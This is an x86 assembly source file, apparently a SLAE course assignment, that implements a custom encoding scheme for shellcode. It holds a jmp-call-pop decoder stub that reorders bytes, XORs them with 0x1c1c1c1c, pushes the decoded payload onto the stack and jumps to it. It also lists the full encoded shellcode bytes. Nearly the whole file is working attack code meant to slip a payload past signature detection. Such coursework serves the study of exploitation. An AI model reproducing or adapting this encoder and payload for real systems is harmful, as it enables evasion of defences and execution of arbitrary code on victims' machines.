;Description:	Assignment #4 (Custom_Encoding_Schema, 186 bytes with EncodedShellcode)
;Shellcode:		\xeb\x4b\x5e\x31\xc0\x31\xdb\xb1\x0d\x31\xd2\x8a\x26\x8a\x46\x01\xc1\xc0\x10\x8a\x66\x02\x8a\x46\x03\x83\xc6\x04\x8a\x3e\x8a\x5e\x01\xc1\xc3\x10\x8a\x7e\x02\x8a\x5e\x03\x83\xc6\x04\x88\xe6\xc1\xc0\x10\x88\xf0\xc1\xc0\x10\x88\xfe\xc1\xc3\x10\x88\xf3\x66\x89\xd8\x35\x1c\x1c\x1c\x1c\x50\xfe\xc9\x75\xc0\xff\xe4\xe8\xb0\xff\xff\xff\x74\xe5\x6f\xe4\x33\xe3\x72\xe2\x75\xe1\x7e\xe0\x33\xdf\x33\xde\xe3\xdd\xe3\xdc\xe3\xdb\xca\xda\xf4\xd9\x9c\xd8\xd1\xd7\x17\xd6\xac\xd5\xfd\xd4\x95\xd3\x4b\xd2\x27\xd1\x91\xd0\x4c\xcf\xdc\xce\x2d\xcd\xff\xcc\x95\xcb\x4c\xca\x1b\xc9\x2f\xc8\xdc\xc7\x2d\xc6\x4c\xc5\x1a\xc4\x2f\xc3\x18\xc2\x6a\xc1\x91\xc0\x1f\xbf\xd8\xbe\x9f\xbd\x4c\xbc\xfe\xbb\x95\xba\x4c\xb9\xdc\xb8\x2d\xb7\xeb\xb6\x95\xb5\x42\xb4\x39\xb3\xf7\xb2
;Author:	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:	526

global _start
section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor eax,eax
	xor ebx,ebx
	mov cl,13	;This is the counter. The shellcode is 104 bytes and this program read 8 byte every cycle so 104/8=13
	xor edx,edx
ll:	mov ah, BYTE [esi]
	mov al, BYTE [esi +1]
	rol eax,16
	mov ah, BYTE [esi +2] 
	mov al, BYTE [esi +3]
	add esi,4
	mov bh, BYTE [esi]
	mov bl, BYTE [esi +1]
	rol ebx,16
	mov bh, BYTE [esi +2]
	mov bl, BYTE [esi +3]
	add esi,4

	mov dh,ah
	rol eax,16
	mov al,dh
	rol eax,16
	
	mov dh,bh
	rol ebx,16
	mov bl,dh
	
	mov ax,bx
	xor eax,0x1c1c1c1c
	push eax
	dec cl
	jnz ll
	jmp esp	

call_shellcode:
	call decoder
	EncodedShellcode db 0x74,0xe5,0x6f,0xe4,0x33,0xe3,0x72,0xe2,0x75,0xe1,0x7e,0xe0,0x33,0xdf,0x33,0xde,0xe3,0xdd,0xe3,0xdc,0xe3,0xdb,0xca,0xda,0xf4,0xd9,0x9c,0xd8,0xd1,0xd7,0x17,0xd6,0xac,0xd5,0xfd,0xd4,0x95,0xd3,0x4b,0xd2,0x27,0xd1,0x91,0xd0,0x4c,0xcf,0xdc,0xce,0x2d,0xcd,0xff,0xcc,0x95,0xcb,0x4c,0xca,0x1b,0xc9,0x2f,0xc8,0xdc,0xc7,0x2d,0xc6,0x4c,0xc5,0x1a,0xc4,0x2f,0xc3,0x18,0xc2,0x6a,0xc1,0x91,0xc0,0x1f,0xbf,0xd8,0xbe,0x9f,0xbd,0x4c,0xbc,0xfe,0xbb,0x95,0xba,0x4c,0xb9,0xdc,0xb8,0x2d,0xb7,0xeb,0xb6,0x95,0xb5,0x42,0xb4,0x39,0xb3,0xf7,0xb2
